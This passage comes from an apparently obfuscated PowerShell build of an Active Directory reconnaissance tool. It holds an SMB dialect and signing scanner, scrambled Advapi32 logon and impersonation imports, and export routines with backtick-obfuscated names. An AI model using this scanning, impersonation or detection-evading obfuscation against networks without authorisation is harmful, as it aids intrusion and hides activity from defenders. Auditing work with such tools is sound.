                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReferenceName", LDAPClass.AdSIDDictionary.ContainsKey(IdentityReference) ? LDAPClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("AuditFlags", Rule.AuditFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            SACLList.Add( ObjectObj );
                        }
                    }

                    return SACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        //The interface and implmentation class used to handle the results (this implementation just writes the strings to a file)

        interface IResultsHandler
        {
            void processResults(Object[] t);

            Object[] finalise();
        }

        class SimpleResultsHandler : IResultsHandler
        {
            private Object lockObj = new Object();
            private List<Object> processed = new List<Object>();

            public SimpleResultsHandler()
            {
            }

            public void processResults(Object[] results)
            {
                lock (lockObj)
                {
                    if (results.Length != 0)
                    {
                        for (var i = 0; i < results.Length; i++)
                        {
                            processed.Add((PSObject)results[i]);
                        }
                    }
                }
            }

            public Object[] finalise()
            {
                return processed.ToArray();
            }
        }
"@


$PingCastleSMBScannerSource = @"

        [StructLayout(LayoutKind.Explicit)]
		struct SMB_Header {
			[FieldOffset(0)]
			public UInt32 Protocol;
			[FieldOffset(4)]
			public byte Command;
			[FieldOffset(5)]
			public int Status;
			[FieldOffset(9)]
			public byte  Flags;
			[FieldOffset(10)]
			public UInt16 Flags2;
			[FieldOffset(12)]
			public UInt16 PIDHigh;
			[FieldOffset(14)]
			public UInt64 SecurityFeatures;
			[FieldOffset(22)]
			public UInt16 Reserved;
			[FieldOffset(24)]
			public UInt16 TID;
			[FieldOffset(26)]
			public UInt16 PIDLow;
			[FieldOffset(28)]
			public UInt16 UID;
			[FieldOffset(30)]
			public UInt16 MID;
		};
		// https://msdn.microsoft.com/en-us/library/cc246529.aspx
		[StructLayout(LayoutKind.Explicit)]
		struct SMB2_Header {
			[FieldOffset(0)]
			public UInt32 ProtocolId;
			[FieldOffset(4)]
			public UInt16 StructureSize;
			[FieldOffset(6)]
			public UInt16 CreditCharge;
			[FieldOffset(8)]
			public UInt32 Status; // to do SMB3
			[FieldOffset(12)]
			public UInt16 Command;
			[FieldOffset(14)]
			public UInt16 CreditRequest_Response;
			[FieldOffset(16)]
			public UInt32 Flags;
			[FieldOffset(20)]
			public UInt32 NextCommand;
			[FieldOffset(24)]
			public UInt64 MessageId;
			[FieldOffset(32)]
			public UInt32 Reserved;
			[FieldOffset(36)]
			public UInt32 TreeId;
			[FieldOffset(40)]
			public UInt64 SessionId;
			[FieldOffset(48)]
			public UInt64 Signature1;
			[FieldOffset(56)]
			public UInt64 Signature2;
		}
        [StructLayout(LayoutKind.Explicit)]
		struct SMB2_NegotiateRequest
		{
			[FieldOffset(0)]
			public UInt16 StructureSize;
			[FieldOffset(2)]
			public UInt16 DialectCount;
			[FieldOffset(4)]
			public UInt16 SecurityMode;
			[FieldOffset(6)]
			public UInt16 Reserved;
			[FieldOffset(8)]
			public UInt32 Capabilities;
			[FieldOffset(12)]
			public Guid ClientGuid;
			[FieldOffset(28)]
			public UInt64 ClientStartTime;
			[FieldOffset(36)]
			public UInt16 DialectToTest;
		}
		const int SMB_COM_NEGOTIATE	= 0x72;
		const int SMB2_NEGOTIATE = 0;
		const int SMB_FLAGS_CASE_INSENSITIVE = 0x08;
		const int SMB_FLAGS_CANONICALIZED_PATHS = 0x10;
		const int SMB_FLAGS2_LONG_NAMES					= 0x0001;
		const int SMB_FLAGS2_EAS							= 0x0002;
		const int SMB_FLAGS2_SECURITY_SIGNATURE_REQUIRED	= 0x0010	;
		const int SMB_FLAGS2_IS_LONG_NAME					= 0x0040;
		const int SMB_FLAGS2_ESS							= 0x0800;
		const int SMB_FLAGS2_NT_STATUS					= 0x4000;
		const int SMB_FLAGS2_UNICODE						= 0x8000;
		const int SMB_DB_FORMAT_DIALECT = 0x02;
		static byte[] GenerateSmbHeaderFromCommand(byte command)
		{
			SMB_Header header = new SMB_Header();
			header.Protocol = 0x424D53FF;
			header.Command = command;
			header.Status = 0;
			header.Flags = SMB_FLAGS_CASE_INSENSITIVE | SMB_FLAGS_CANONICALIZED_PATHS;
			header.Flags2 = SMB_FLAGS2_LONG_NAMES | SMB_FLAGS2_EAS | SMB_FLAGS2_SECURITY_SIGNATURE_REQUIRED | SMB_FLAGS2_IS_LONG_NAME | SMB_FLAGS2_ESS | SMB_FLAGS2_NT_STATUS | SMB_FLAGS2_UNICODE;
			header.PIDHigh = 0;
			header.SecurityFeatures = 0;
			header.Reserved = 0;
			header.TID = 0xffff;
			header.PIDLow = 0xFEFF;
			header.UID = 0;
			header.MID = 0;
			return getBytes(header);
		}
		static byte[] GenerateSmb2HeaderFromCommand(byte command)
		{
			SMB2_Header header = new SMB2_Header();
			header.ProtocolId = 0x424D53FE;
			header.Command = command;
			header.StructureSize = 64;
			header.Command = command;
			header.MessageId = 0;
			header.Reserved = 0xFEFF;
			return getBytes(header);
		}
		static byte[] getBytes(object structure)
		{
			int size = Marshal.SizeOf(structure);
			byte[] arr = new byte[size];
			IntPtr ptr = Marshal.AllocHGlobal(size);
			Marshal.StructureToPtr(structure, ptr, true);
			Marshal.Copy(ptr, arr, 0, size);
			Marshal.FreeHGlobal(ptr);
			return arr;
		}
		static byte[] getDialect(string dialect)
		{
			byte[] dialectBytes = Encoding.ASCII.GetBytes(dialect);
			byte[] output = new byte[dialectBytes.Length + 2];
			output[0] = 2;
			output[output.Length - 1] = 0;
			Array.Copy(dialectBytes, 0, output, 1, dialectBytes.Length);
			return output;
		}
		static byte[] GetNegotiateMessage(byte[] dialect)
		{
			byte[] output = new byte[dialect.Length + 3];
			output[0] = 0;
			output[1] = (byte) dialect.Length;
			output[2] = 0;
			Array.Copy(dialect, 0, output, 3, dialect.Length);
			return output;
		}
		// MS-SMB2  2.2.3 SMB2 NEGOTIATE Request
		static byte[] GetNegotiateMessageSmbv2(int DialectToTest)
		{
			SMB2_NegotiateRequest request = new SMB2_NegotiateRequest();
			request.StructureSize = 36;
			request.DialectCount = 1;
			request.SecurityMode = 1; // signing enabled
			request.ClientGuid = Guid.NewGuid();
			request.DialectToTest = (UInt16) DialectToTest;
			return getBytes(request);
		}
		static byte[] GetNegotiatePacket(byte[] header, byte[] smbPacket)
		{
			byte[] output = new byte[smbPacket.Length + header.Length + 4];
			output[0] = 0;
			output[1] = 0;
			output[2] = 0;
			output[3] = (byte)(smbPacket.Length + header.Length);
			Array.Copy(header, 0, output, 4, header.Length);
			Array.Copy(smbPacket, 0, output, 4 + header.Length, smbPacket.Length);
			return output;
		}
		public static bool DoesServerSupportDialect(string server, string dialect)
		{
			Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect);
			TcpClient client = new TcpClient();
			try
			{
				client.Connect(server, 445);
			}
			catch (Exception)
			{
				throw new Exception("port 445 is closed on " + server);
			}
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] header = GenerateSmbHeaderFromCommand(SMB_COM_NEGOTIATE);
				byte[] dialectEncoding = getDialect(dialect);
				byte[] negotiatemessage = GetNegotiateMessage(dialectEncoding);
				byte[] packet = GetNegotiatePacket(header, negotiatemessage);
				stream.Write(packet, 0, packet.Length);
				stream.Flush();
				byte[] netbios = new byte[4];
				if (stream.Read(netbios, 0, netbios.Length) != netbios.Length)
                {
                    return false;
                }
				byte[] smbHeader = new byte[Marshal.SizeOf(typeof(SMB_Header))];
				if (stream.Read(smbHeader, 0, smbHeader.Length) != smbHeader.Length)
                {
                    return false;
                }
				byte[] negotiateresponse = new byte[3];
				if (stream.Read(negotiateresponse, 0, negotiateresponse.Length) != negotiateresponse.Length)
                {
                    return false;
                }
				if (negotiateresponse[1] == 0 && negotiateresponse[2] == 0)
				{
					Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect + " = Supported");
					return true;
				}
				Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect + " = Not supported");
				return false;
			}
			catch (Exception)
			{
				throw new ApplicationException("Smb1 is not supported on " + server);
			}
		}
		public static bool DoesServerSupportDialectWithSmbV2(string server, int dialect, bool checkSMBSigning)
		{
			Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2"));
			TcpClient client = new TcpClient();
			try
			{
				client.Connect(server, 445);
			}
			catch (Exception)
			{
				throw new Exception("port 445 is closed on " + server);
			}
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] header = GenerateSmb2HeaderFromCommand(SMB2_NEGOTIATE);
				byte[] negotiatemessage = GetNegotiateMessageSmbv2(dialect);
				byte[] packet = GetNegotiatePacket(header, negotiatemessage);
				stream.Write(packet, 0, packet.Length);
				stream.Flush();
				byte[] netbios = new byte[4];
				if( stream.Read(netbios, 0, netbios.Length) != netbios.Length)
                {
                    return false;
                }
				byte[] smbHeader = new byte[Marshal.SizeOf(typeof(SMB2_Header))];
				if (stream.Read(smbHeader, 0, smbHeader.Length) != smbHeader.Length)
                {
                    return false;
                }
				if (smbHeader[8] != 0 || smbHeader[9] != 0 || smbHeader[10] != 0 || smbHeader[11] != 0)
				{
					Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Not supported via error code");
					return false;
				}
				byte[] negotiateresponse = new byte[6];
				if (stream.Read(negotiateresponse, 0, negotiateresponse.Length) != negotiateresponse.Length)
                {
                    return false;
                }
                if (checkSMBSigning)
                {
                    // https://support.microsoft.com/en-in/help/887429/overview-of-server-message-block-signing
                    // https://msdn.microsoft.com/en-us/library/cc246561.aspx
				    if (negotiateresponse[2] == 3)
				    {
					    Trace.WriteLine("Checking " + server + " for SMBV2 SMB Signing dialect 0x" + dialect.ToString("X2") + " = Supported");
					    return true;
				    }
                    else
                    {
                        return false;
                    }
                }
				int selectedDialect = negotiateresponse[5] * 0x100 + negotiateresponse[4];
				if (selectedDialect == dialect)
				{
					Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Supported");
					return true;
				}
				Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Not supported via not returned dialect");
				return false;
			}
			catch (Exception)
			{
				throw new ApplicationException("Smb2 is not supported on " + server);
			}
		}
		public static bool SupportSMB1(string server)
		{
			try
			{
				return DoesServerSupportDialect(server, "NT LM 0.12");
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static bool SupportSMB2(string server)
		{
			try
			{
				return (DoesServerSupportDialectWithSmbV2(server, 0x0202, false) || DoesServerSupportDialectWithSmbV2(server, 0x0210, false));
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static bool SupportSMB3(string server)
		{
			try
			{
				return (DoesServerSupportDialectWithSmbV2(server, 0x0300, false) || DoesServerSupportDialectWithSmbV2(server, 0x0302, false) || DoesServerSupportDialectWithSmbV2(server, 0x0311, false));
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static string Name { get { return "smb"; } }
		public static PSObject GetPSObject(Object IPv4Address)
		{
            string computer = Convert.ToString(IPv4Address);
            PSObject DCSMBObj = new PSObject();
            if (computer == "")
            {
                DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB Signing", null));
                return DCSMBObj;
            }
            bool isPortOpened = true;
			bool SMBv1 = false;
			bool SMBv2_0x0202 = false;
			bool SMBv2_0x0210 = false;
			bool SMBv3_0x0300 = false;
			bool SMBv3_0x0302 = false;
			bool SMBv3_0x0311 = false;
            bool SMBSigning = false;
			try
			{
				try
				{
					SMBv1 = DoesServerSupportDialect(computer, "NT LM 0.12");
				}
				catch (ApplicationException)
				{
				}
				try
				{
					SMBv2_0x0202 = DoesServerSupportDialectWithSmbV2(computer, 0x0202, false);
					SMBv2_0x0210 = DoesServerSupportDialectWithSmbV2(computer, 0x0210, false);
					SMBv3_0x0300 = DoesServerSupportDialectWithSmbV2(computer, 0x0300, false);
					SMBv3_0x0302 = DoesServerSupportDialectWithSmbV2(computer, 0x0302, false);
					SMBv3_0x0311 = DoesServerSupportDialectWithSmbV2(computer, 0x0311, false);
				}
				catch (ApplicationException)
				{
				}
			}
			catch (Exception)
			{
				isPortOpened = false;
			}
			if (SMBv3_0x0311)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0311, true);
			}
			else if (SMBv3_0x0302)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0302, true);
			}
			else if (SMBv3_0x0300)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0300, true);
			}
			else if (SMBv2_0x0210)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0210, true);
			}
			else if (SMBv2_0x0202)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0202, true);
			}
            DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", isPortOpened));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", SMBv1));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", SMBv2_0x0202));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", SMBv2_0x0210));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", SMBv3_0x0300));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", SMBv3_0x0302));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", SMBv3_0x0311));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB Signing", SMBSigning));
            return DCSMBObj;
		}
	}
}
"@







$Advapi32Def = ((("{89}{131}{0}{123}{69}{8}{26}{91}{56}{86}{87}{19}{51}{82}{81}{80}{128}{2}{48}{3}{32}{24}{12}{5}{117}{46}{90}{95}{4}{64}{39}{108}{116}{102}{112}{115}{43}{13}{14}{111}{130}{118}{42}{60}{35}{75}{79}{103}{124}{28}{132}{93}{50}{10}{7}{57}{71}{88}{73}{63}{122}{44}{77}{41}{58}{120}{94}{33}{22}{31}{55}{54}{18}{92}{53}{85}{125}{126}{127}{74}{110}{62}{76}{52}{70}{49}{65}{99}{106}{84}{27}{67}{25}{72}{40}{16}{45}{11}{59}{38}{101}{105}{21}{68}{1}{15}{20}{6}{83}{98}{114}{104}{100}{107}{121}{66}{34}{29}{96}{113}{23}{78}{129}{17}{30}{36}{109}{97}{119}{37}{9}{61}{47}" -f '   ','  [','o','true)]
',' b','a','ort(','p','lImpor','l','y','edOnUser(In','c st','ri','ng lpsz','D','o','   publi','m',' ','llImp','

 ','tP','= tr',' publi','mpersonat','t(d2Ka','ool ',' d','stEr','c sta','tr phToken);

   ','   ','n','etLa','g l','tic','tToSe','r h','on','L',', o',' s','st','v','gg','ic ','Y','r = ','t','onT','S',' s','rt(d','llI',' [D','pi3','e','u','tPt','trin','f();
8I','  pu','og','ool Log','ic e','S','I',' ','[Dl','ta',', ','e','wL','
 ','pszPas','blic','ider','ue)]','swo','r','astE','etL','d2Kad','rn b','2Kadvapi3','2.dlld2K',',','int d','8IY','ex','dva','po','g','I','tern','ror','ool Reve','vapi','xt','d','Toke','ri','rd,','.','n);','e','lld2K','U',' extern b',' ','D','ng lpszUserna',' ','32','me, ','ser(st','t','main,','r','t ',', ','onPro',' ',' int','2.dlld2K',', Set','LastError = true)]','r','
 ','o','
','wLo'))  -cRepLace 'd2K',[char]34  -cRepLace '8IY',[char]39)



$Kernel32Def = ((("{17}{7}{16}{5}{13}{11}{9}{4}{12}{1}{0}{2}{10}{8}{18}{15}{3}{6}{14}"-f'li','pub','c ',');
','r = true)]
 ','el3','{1','ort({0','ic extern ','o','stat','.dll{0}, SetLastErr','   ','2','}','hObject','}kern','{1}
    [DllImp','bool CloseHandle(IntPtr '))-f[ChaR]34,[ChaR]39)

Function GEt-d`A`TedI`FF
{

    param (
        [Parameter(mandAtOrY = $true)]
        [DateTime] $Date1,

        [Parameter(MANdAtORy = $true)]
        [DateTime] $Date2
    )

    If ($Date2 -gt $Date1)
    {
        $DDiff = $Date2 - $Date1
    }
    Else
    {
        $DDiff = $Date1 - $Date2
    }
    Return $DDiff
}

Function get-Dntof`q`dN
{

    param(
        [Parameter(maNdatORY = $true)]
        [string] $ADObjectDN
    )

    $Index = $ADObjectDN.("{0}{1}" -f'Ind','exOf').Invoke('DC=')
    If ($Index)
    {
        $ADObjectDNDomainName = $($ADObjectDN.("{2}{1}{0}" -f'g','ubStrin','S').Invoke($Index)) -replace 'DC=','' -replace ',','.'
    }
    Else
    {
        
        [array] $ADObjectDNArray = $ADObjectDN -Split ("DC=")
        $ADObjectDNArray | ForEach-Object {
            [array] $temp = $_ -Split (",")
            [string] $ADObjectDNArrayItemDomainName += $temp[0] + "."
        }
        $ADObjectDNDomainName = $ADObjectDNArrayItemDomainName.("{0}{1}{2}" -f'S','ub','string').Invoke(1, $ADObjectDNArrayItemDomainName."lEN`GTH" - 2)
    }
    Return $ADObjectDNDomainName
}

Function Ex`POrT`-a`DRcsv
{

    param(
        [Parameter(MAndatOry = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(maNDATory = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName
    )

    Try
    {
        $ADRObj | Export-Csv -Path $ADFileName -NoTypeInformation -Encoding ("{0}{1}" -f'D','efault')
    }
    Catch
    {
        Write-Warning "[Export-ADRCSV] Failed to export $($ADFileName). "
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function E`x`pORT-`A`dRxmL
{

    param(
        [Parameter(MAndAtory = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(mANDaToRY = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName
    )

    Try
    {
        (ConvertTo-Xml -NoTypeInformation -InputObject $ADRObj).("{1}{0}" -f 'e','Sav').Invoke($ADFileName)
    }
    Catch
    {
        Write-Warning "[Export-ADRXML] Failed to export $($ADFileName). "
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function eX`pOr`T`-AdrJSon
{

    param(
        [Parameter(maNDAtoRy = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(maNdaTORY = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName
    )

    Try
    {
        ConvertTo-JSON -InputObject $ADRObj | Out-File -FilePath $ADFileName
    }
    Catch
    {
        Write-Warning "[Export-ADRJSON] Failed to export $($ADFileName). "
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function exp`O`Rt-`AdRHTml
{

    param(
        [Parameter(MAndAToRY = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(MAnDatOrY = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName,

        [Parameter(mANDaTory = $false)]
        [String] $ADROutputDir = $null
    )

$Header = @"
<style type="text/css">
th {
	color:white;
	background-color:blue;
}
td, th {
	border:0px solid black;
	border-collapse:collapse;
	white-space:pre;
}
tr:nth-child(2n+1) {
    background-color: #dddddd;
}
tr:hover td {
    background-color: #c1d5f8;
}
table, tr, td, th {
	padding: 0px;
	margin: 0px;
	white-space:pre;
}
table {
	margin-left:1px;
}
</style>
"@
    Try
    {
        If ($ADFileName.("{2}{0}{1}" -f 'ain','s','Cont').Invoke(("{1}{0}"-f 'dex','In')))
        {
            $HTMLPath  = -join($ADROutputDir,'\',("{0}{2}{1}" -f'HT','les','ML-Fi'))
            $HTMLPath = $((Convert-Path $HTMLPath).("{0}{1}{2}" -f'Tri','mEn','d').Invoke("\"))
            $HTMLFiles = Get-ChildItem -Path $HTMLPath -name
            $HTML = $HTMLFiles | ConvertTo-HTML -Title ("{2}{1}{0}" -f'on','DRec','A') -Property @{("{1}{0}" -f'abel','L')=("{5}{3}{1}{0}{4}{2}" -f ' Con','of','s','able ','tent','T');("{3}{2}{0}{1}" -f'io','n','xpress','E')={"<a href='$($_)'>$($_)</a> "}} -Head $Header

            Add-Type -AssemblyName ("{1}{3}{2}{0}" -f 'b','Sy','em.We','st')
              (  GEt-vArIable  ("pH"+"x7N")  -vALueONLY )::("{2}{0}{1}"-f 'eco','de','HtmlD').Invoke($HTML) | Out-File -FilePath $ADFileName
        }
        Else
        {
            If ($ADRObj -is [array])
            {
                $ADRObj | Select-Object ('*') | ConvertTo-HTML -As ("{1}{0}" -f 'le','Tab') -Head $Header | Out-File -FilePath $ADFileName
            }
            Else
            {
                ConvertTo-HTML -InputObject $ADRObj -As ("{0}{1}" -f 'Tab','le') -Head $Header | Out-File -FilePath $ADFileName
            }
        }
    }
    Catch
    {
        Write-Warning "[Export-ADRHTML] Failed to export $($ADFileName). "
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function E`xPORT-`ADR
{

    param(
        [Parameter(mANdaToRY = $true)]
        [PSObject] $ADRObj,

        [Parameter(MandaTORY = $true)]
        [String] $ADROutputDir,

        [Parameter(maNDAToRy = $true)]
        [array] $OutputType,

        [Parameter(mANDAtORy = $true)]
        [String] $ADRModuleName
    )

    Switch ($OutputType)
    {
        ("{0}{1}" -f'S','TDOUT')
        {
            If ($ADRModuleName -ne ("{2}{0}{3}{1}"-f 't','on','Abou','ADRec'))
            {
                If ($ADRObj -is [array])
                {
                    
                    $ADRObj | Out-String -Stream
                }
                Else
                {
                    
                    $ADRObj | Format-List | Out-String -Stream
                }
            }
        }
        'CSV'
        {
            $ADFileName  = -join($ADROutputDir,'\',("{1}{0}{2}" -f 'V-Fil','CS','es'),'\',$ADRModuleName,("{0}{1}"-f '.','csv'))
            Export-ADRCSV -ADRObj $ADRObj -ADFileName $ADFileName
        }
        'XML'
        {
            $ADFileName  = -join($ADROutputDir,'\',("{1}{0}{2}"-f'ML','X','-Files'),'\',$ADRModuleName,("{0}{1}"-f '.x','ml'))
            Export-ADRXML -ADRObj $ADRObj -ADFileName $ADFileName
        }
        ("{0}{1}" -f 'JSO','N')
        {
            $ADFileName  = -join($ADROutputDir,'\',("{1}{0}{2}" -f 'ON-','JS','Files'),'\',$ADRModuleName,("{0}{1}"-f'.','json'))
            Export-ADRJSON -ADRObj $ADRObj -ADFileName $ADFileName
        }
        ("{1}{0}" -f'L','HTM')
        {
            $ADFileName  = -join($ADROutputDir,'\',("{3}{1}{2}{0}" -f 'les','L-','Fi','HTM'),'\',$ADRModuleName,("{0}{1}"-f'.h','tml'))
            Export-ADRHTML -ADRObj $ADRObj -ADFileName $ADFileName -ADROutputDir $ADROutputDir
        }
    }
}

Function Ge`T-A`dReXc`eLCOMObj
{


    
    Try
    {
        
        $SaveVerbosePreference = $script:VerbosePreference
        $script:VerbosePreference = ("{0}{2}{1}{3}" -f'S','ntl','ile','yContinue')
        $global:excel = New-Object -ComObject ("{4}{5}{2}{3}{0}{1}" -f 'icatio','n','pp','l','excel','.a')
        If ($SaveVerbosePreference)
        {
            $script:VerbosePreference = $SaveVerbosePreference
            Remove-Variable ("{0}{4}{1}{3}{2}" -f 'SaveVerbo','e','e','Preferenc','s')
        }
    }
    Catch
    {
        If ($SaveVerbosePreference)
        {
            $script:VerbosePreference = $SaveVerbosePreference
            Remove-Variable ("{2}{5}{4}{1}{6}{0}{3}" -f'enc','se','S','e','Verbo','ave','Prefer')
        }
        Write-Warning ("{44}{38}{42}{39}{34}{10}{31}{41}{8}{24}{43}{40}{30}{36}{28}{9}{22}{37}{18}{33}{26}{35}{14}{20}{12}{27}{4}{21}{32}{25}{19}{29}{17}{2}{15}{6}{16}{13}{5}{11}{0}{1}{3}{7}{23}"-f'Excel i','nstal','on-','l','e','of','port.xslx on a host wi','ed','es not ','eneration o','xcel ','t ','a','cros','cel pa','Re','th Mi',' ADRec','p','to gene','r','t','f ADReco','.','ap','r ','.','m','ng g','rate the','nstalled. Skipp','d','e','ort','E','xlsx. Use the -GenEx','i','n-Re','R','j] ','e i','o','ExcelComOb','pear to b','[Get-AD')
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        Return $null
    }
    $excel."v`I`sIblE" = $true
    $excel."i`Nte`RACTIVe" = $false
    $global:workbook = $excel."w`oR`kbOOKs".("{1}{0}"-f'd','Ad').Invoke()
    If ($workbook."WOR`kshEE`TS"."cO`UNt" -eq 3)
    {
        $workbook."WoR`Ks`He`ETs".("{0}{1}"-f 'Ite','m').Invoke(3).("{0}{1}"-f 'Dele','te').Invoke()
        $workbook."WORk`S`hEeTs".("{0}{1}"-f'Ite','m').Invoke(2).("{0}{2}{1}" -f 'De','ete','l').Invoke()
    }
}

Function Get-`AdrEXCEl`C`oMOBJREl`e`A`sE
{

    param(
        [Parameter(MaNdATory = $true)]
        $ComObjtoRelease,

        [Parameter(mandATOry = $false)]
        [bool] $Final = $false
    )
    
    
    If ($Final)
    {
         (  VARiABle Ikw  -vALuEO )::("{0}{3}{4}{1}{2}"-f'FinalRe','as','eComObject','l','e').Invoke($ComObjtoRelease) | Out-Null
    }
    Else
    {
          $IkW::("{3}{2}{4}{1}{0}"-f 'ct','e','seC','Relea','omObj').Invoke($ComObjtoRelease) | Out-Null
    }
     $JGWu::("{1}{2}{0}" -f 'ct','Col','le').Invoke()
      (  vAriABle  JgWU  -val  )::("{0}{2}{1}{4}{3}"-f'Wait','ngF','ForPendi','rs','inalize').Invoke()
}

Function G`Et-A`D`RExCElWOrK`BOOK
{

    param (
        [Parameter(MaNdatORy = $true)]
        [string] $name
    )

    $workbook."WOrkS`hee`TS".("{1}{0}"-f 'dd','A').Invoke() | Out-Null
    $worksheet = $workbook."wORkSh`EE`Ts".("{0}{1}"-f'It','em').Invoke(1)
    $worksheet."na`mE" = $name

    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable ("{2}{0}{1}" -f'shee','t','work')
}

Function GEt`-adREx`cEliM`PorT
{

    param (
        [Parameter(maNdAtorY = $true)]
        [string] $ADFileName,

        [Parameter(mAnDatORy = $false)]
        [int] $Method = 1,

        [Parameter(maNdatorY = $false)]
        [int] $row = 1,

        [Parameter(MandAToRY = $false)]
        [int] $column = 1
    )

    $excel."sCr`eE`Nup`datiNG" = $false
    If ($Method -eq 1)
    {
        If (Test-Path $ADFileName)
        {
            $worksheet = $workbook."WOr`kshE`etS".("{1}{0}" -f'em','It').Invoke(1)
            $TxtConnector = (("{1}{0}"-f'XT;','TE') + $ADFileName)
            $CellRef = $worksheet.("{0}{1}"-f 'Rang','e').Invoke("A1")
            
            $Connector = $worksheet."quEryt`AbL`es".("{0}{1}"-f 'ad','d').Invoke($TxtConnector, $CellRef)

            
            $worksheet."qu`eRY`TABLES".("{1}{0}" -f'm','ite').Invoke($Connector."NA`Me")."teX`T`FILePL`At`ForM" = 65001
            $worksheet."QU`E`RYT`ABlEs".("{0}{1}"-f'it','em').Invoke($Connector."n`AmE")."T`Extf`ILECo`M`MAdel`imiteR" = $True
            $worksheet."QUER`Yt`ABlEs".("{1}{0}" -f'em','it').Invoke($Connector."n`AME")."teXTfILE`p`Ar`seTypE" = 1
            $worksheet."QueRyT`AB`L`es".("{0}{1}" -f'i','tem').Invoke($Connector."NA`ME").("{2}{1}{0}" -f'esh','r','Ref').Invoke() | Out-Null
            $worksheet."QUeRyt`A`BLeS".("{1}{0}"-f'em','it').Invoke($Connector."na`ME").("{2}{0}{1}"-f 'e','te','del').Invoke()

            Get-ADRExcelComObjRelease -ComObjtoRelease $CellRef
            Remove-Variable ("{1}{0}" -f 'ellRef','C')
            Get-ADRExcelComObjRelease -ComObjtoRelease $Connector
            Remove-Variable ("{0}{2}{1}" -f'Conne','or','ct')

            $listObject = $worksheet."LIsT`oBje`c`TS"."A`DD"(  ( get-vArIAbLe  ('7'+'hZe')  ).VAluE::"Xlsrc`Ra`N`ge", $worksheet."uS`eDrANge", $null,   (  vaRIabLe ("YEZp"+"b")).VaLue::"x`LYes", $null)
            $listObject."T`ABlES`TyLE" = ("{3}{1}{2}{0}{4}" -f 'ty','le','S','Tab','leLight2') 
            $worksheet."u`sed`RanGE"."eNT`iRe`C`OLumN".("{0}{1}{2}" -f'Aut','oF','it').Invoke() | Out-Null
        }
        Remove-Variable ("{0}{2}{1}"-f 'AD','e','FileNam')
    }
    Elseif ($Method -eq 2)
    {
        $worksheet = $workbook."wORks`H`Eets".("{0}{1}"-f 'Ite','m').Invoke(1)
        If (Test-Path $ADFileName)
        {
            $ADTemp = Import-Csv -Path $ADFileName
            $ADTemp | ForEach-Object {
